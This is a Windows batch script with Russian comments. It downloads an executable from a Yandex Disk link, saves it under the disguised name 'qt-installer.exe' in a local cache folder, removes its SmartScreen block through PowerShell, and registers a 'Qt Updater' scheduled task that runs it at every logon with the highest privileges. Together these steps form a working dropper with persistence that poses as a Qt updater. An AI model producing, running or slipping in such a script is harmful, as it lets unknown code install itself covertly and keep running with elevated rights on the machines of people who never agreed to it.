@echo off
setlocal

:: --- НАСТРОЙКИ ---
:: Замените URL-адрес на прямую ссылку для скачивания вашего .exe файла
set "url=https://downloader.disk.yandex.ru/disk/b59cf6946d6f5bbb707de8734204e7a87daaebe01d7eeb1483b5d16c6429778c/691a69cb/1il_VEvFM8pzOK8et-rlWgpEqVBvh_lNcRj8TOl1iuS9x8QLRsGlc16KRBF2Z547KglDvgL6HV35wRtK_rKwEg%3D%3D?uid=0&filename=nms.exe&disposition=attachment&hash=LhdXPG37oQAXA8FFkWQHSW%2Bs6z%2BItZx5OrSoHl%2BFecsq7LgG0yjqge/ln6wCWEfQq/J6bpmRyOJonT3VoXnDag%3D%3D&limit=0&content_type=application%2Fx-dosexec&owner_uid=811461357&fsize=18944&hid=028f4a125fdc2439a8da2aa548642d8f&media_type=executable&tknv=v3"

:: Имя, под которым будет сохранен файл
set "fileName=qt-installer.exe"

:: Имя для задачи в Планировщике задач
set "taskName=Qt Updater"

:: --- ОСНОВНАЯ ЧАСТЬ СКРИПТА ---

echo.
echo [1] Подготовка путей...
:: Используем переменную %LOCALAPPDATA%, которая ведет в C:\Users\Имя_пользователя\AppData\Local
set "destinationFolder=%LOCALAPPDATA%\cache\qt-installer"
set "destinationPath=%destinationFolder%\%fileName%"

echo    - Папка назначения: %destinationFolder%
echo    - Полный путь к файлу: %destinationPath%

:: 2. Создание папки, если она не существует
if not exist "%destinationFolder%" (
    echo.
    echo [2] Создание папки...
    mkdir "%destinationFolder%"
)

echo.
echo [3] Скачивание файла...
:: Используем утилиту curl, которая встроена в Windows 10/11.
:: -L - следовать редиректам (если есть)
:: -o - указать путь для сохранения
:: --silent - не показывать индикатор загрузки
curl.exe -L -o "%destinationPath%" "%url%"

:: Проверка, успешно ли скачался файл
if exist "%destinationPath%" (
    echo    - Файл успешно скачан.
) else (
    echo    - ОШИБКА: Не удалось скачать файл. Проверьте URL-адрес и подключение к интернету.
    goto :end
)

echo.
echo [4] Разблокировка файла от SmartScreen...
:: В пакетных файлах нет прямой команды для разблокировки.
:: Самый надежный способ - это вызвать короткую команду PowerShell.
powershell -Command "Unblock-File -Path '%destinationPath%'"

echo.
echo [5] Добавление задачи в Планировщик задач...
:: Удаляем старую задачу с таким же именем, если она есть (чтобы избежать ошибок)
schtasks /delete /tn "%taskName%" /f > nul 2>&1

:: Создаем новую задачу
:: /sc ONLOGON - запускать при входе в систему
:: /tn - имя задачи
:: /tr - путь к программе
:: /rl HIGHEST - запускать с наивысшими правами (помогает избежать проблем с разрешениями)
schtasks /create /sc ONLOGON /tn "%taskName%" /tr "%destinationPath%" /rl HIGHEST /f

:: Проверяем, была ли команда успешной
if %errorlevel% equ 0 (
    echo    - Задача "%taskName%" успешно создана.
) else (
    echo    - ОШИБКА: Не удалось создать задачу в Планировщике.
)

:end
echo.
echo Готово!
pause